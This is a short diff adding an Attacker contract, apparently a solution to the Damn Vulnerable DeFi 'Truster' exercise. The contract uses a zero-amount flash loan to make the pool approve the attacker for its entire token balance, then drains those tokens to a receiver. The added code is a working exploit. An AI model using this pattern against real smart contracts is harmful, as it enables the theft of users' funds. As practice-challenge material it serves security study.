@@ -34,3 +34,30 @@ contract TrusterLenderPool is ReentrancyGuard {
         return true;
     }
 }
+
+
+contract Attacker {
+    TrusterLenderPool public immutable pool;
+    DamnValuableToken public immutable token;
+
+
+    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address receiver) {
+        pool = _pool;
+        token = _token;
+
+        bytes memory callData = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            token.balanceOf(address(pool))
+        );
+
+        pool.flashLoan(
+            0, // to make repay possible
+            address(this),
+            address(token),
+            callData
+        );
+
+        token.transferFrom(address(pool), receiver, token.balanceOf(address(pool)));
+    }
+}
